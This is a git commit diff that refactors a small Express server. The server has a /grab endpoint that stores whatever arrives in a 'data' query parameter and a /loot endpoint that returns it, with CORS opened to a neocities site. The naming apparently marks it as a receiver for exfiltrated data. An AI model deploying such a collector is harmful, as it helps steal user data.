4116a4a3017218a8fbd35deb1f60ac1200ae6018
datadiego <juandiegomariscal@gmail.com>
2024-10-03 00:51:11 +0200

    refactorizacion

--- server.js
+++ server.js
@@ -1,3 +1,9 @@
+/*
+░█▀▄░█▀▀░█▀█░█▀▀░█▀█░█▀▄░█▀▀░█▀█░█▀▀░▀█▀░█▀█░█▀▀
+░█░█░█▀▀░█▀▀░█▀▀░█░█░█░█░█▀▀░█░█░█░░░░█░░█▀█░▀▀█
+░▀▀░░▀▀▀░▀░░░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀
+*/
+
 const express = require('express');
 const cors = require('cors');
 const fs = require('fs');
@@ -5,24 +11,31 @@ const app = express();
 const port = 3000;
 let texto = "";
 
-app.use(cors());
+/*
+░█▀▀░█▀█░█▀█░█▀▀░▀█▀░█▀▀
+░█░░░█░█░█░█░█▀▀░░█░░█░█
+░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀
+*/
 
+app.use(cors());
 app.use(cors({
     origin: 'https://ultraeffective.neocities.org',
     optionsSuccessStatus: 200
 }));
-
 app.use(express.urlencoded({ extended: true }));
-
 app.use(express.static('public'));
-
 app.use((req, res, next) => {
     console.log(`${req.method} ${req.url}`);
     next();
 });
 
-// Ruta para manejar la solicitud a /grab
-app.get('/grab', (req, res) => {
+/*
+░█▀▀░█▀█░█▀▄░█▀█░█▀█░▀█▀░█▀█░▀█▀░█▀▀
+░█▀▀░█░█░█░█░█▀▀░█░█░░█░░█░█░░█░░▀▀█
+░▀▀▀░▀░▀░▀▀░░▀░░░▀▀▀░▀▀▀░▀░▀░░▀░░▀▀▀
+*/
+
+app.get('/grab', (req, res) => { // captura los datos enviados por el cliente
     const data = req.query.data;
     if(data){
         texto = data;
@@ -32,21 +45,21 @@ app.get('/grab', (req, res) => {
     }
 });
 
-app.get('/loot', (req, res) => {
+app.get('/loot', (req, res) => { // envía los datos guardados al cliente
     res.send(texto);
 });
 
-app.get('/clear', (req, res) => {
-    fs.writeFile('output.txt', '', (err) => {
-        if (err) {
-            console.error('Error al limpiar el archivo:', err);
-            return res.status(500).send('Error al limpiar el archivo.');
-        }
-        res.send('Archivo limpiado correctamente.');
-    });
+app.get('/clear', (req, res) => { // limpia el archivo de salida
+    texto = "";
+    res.send('Archivo limpiado correctamente.');
 });
 
-// Iniciar el servidor
+/*
+░█▀▄░█░█░█▀█
+░█▀▄░█░█░█░█
+░▀░▀░▀▀▀░▀░▀
+*/
+
 app.listen(port, () => {
     console.log(`Servidor escuchando en http://localhost:${port}`);
 });
